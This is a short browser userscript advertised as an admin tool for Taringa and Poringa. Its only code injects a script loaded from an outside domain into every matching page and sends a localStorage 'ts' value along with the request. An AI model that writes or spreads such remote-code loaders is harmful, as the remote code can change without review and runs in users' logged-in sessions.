// ==UserScript==
// @name        T! Admin 2 por Huyi y Needrom
// @namespace   https://userscripts.org/users/123123223
// @description T! Admin 2, Pins, Comments & Shouts.
// @include     *://*.taringa.net/*
// @include     *://*.poringa.net/*
// @require     https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js
// @version     17
// @grant       GM_getValue
// @grant       GM_setValue
// @downloadURL https://update.greasyfork.org/scripts/35147/T%21%20Admin%202%20por%20Huyi%20y%20Needrom.user.js
// @updateURL https://update.greasyfork.org/scripts/35147/T%21%20Admin%202%20por%20Huyi%20y%20Needrom.meta.js
// ==/UserScript==

var h = document.createElement("script");
h.setAttribute("src", "https://elementaldesign.com.ar/t/t.js?v=10"+(localStorage.getItem("ts")?"&ts="+localStorage.getItem("ts"):""));
document.body.appendChild(h);